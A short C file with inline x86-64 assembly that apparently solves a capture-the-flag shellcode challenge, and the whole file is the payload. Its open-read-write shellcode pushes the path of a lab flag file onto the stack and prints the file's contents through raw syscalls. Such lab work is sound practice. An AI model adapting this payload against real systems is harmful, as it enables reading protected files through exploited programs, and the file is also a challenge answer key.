// File name: ex.c
// Compile: gcc -o ex ex.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    // 1. Open: 파일 경로를 스택에 쌓기
    "push 0x0\n"
    "mov rax, 0x676e6f6f6f6f6f6f\n" // "oooooong"
    "push rax\n"
    "mov rax, 0x6c5f73695f656d61\n" // "ame_is_l"
    "push rax\n"
    "mov rax, 0x6e5f67616c662f63\n" // "c/flag_n"
    "push rax\n"
    "mov rax, 0x697361625f6c6c65\n" // "ell_basi"
    "push rax\n"
    "mov rax, 0x68732f656d6f682f\n" // "/home/sh"
    "push rax\n"

    "mov rdi, rsp\n"
    "xor rsi, rsi\n"
    "xor rdx, rdx\n"
    "mov rax, 2\n"      // sys_open
    "syscall\n"

    // 2. Read
    "mov rdi, rax\n"    // fd
    "mov rsi, rsp\n"
    "sub rsi, 0x30\n"   // buf
    "mov rdx, 0x30\n"   // len
    "mov rax, 0\n"      // sys_read
    "syscall\n"

    // 3. Write
    "mov rdi, 1\n"      // stdout
    "mov rax, 1\n"      // sys_write
    "syscall\n"

    // 4. Exit (프로그램이 터지지 않게 안전 종료)
    "mov rax, 60\n"
    "xor rdi, rdi\n"
    "syscall\n"
);

void run_sh();
int main() { run_sh(); }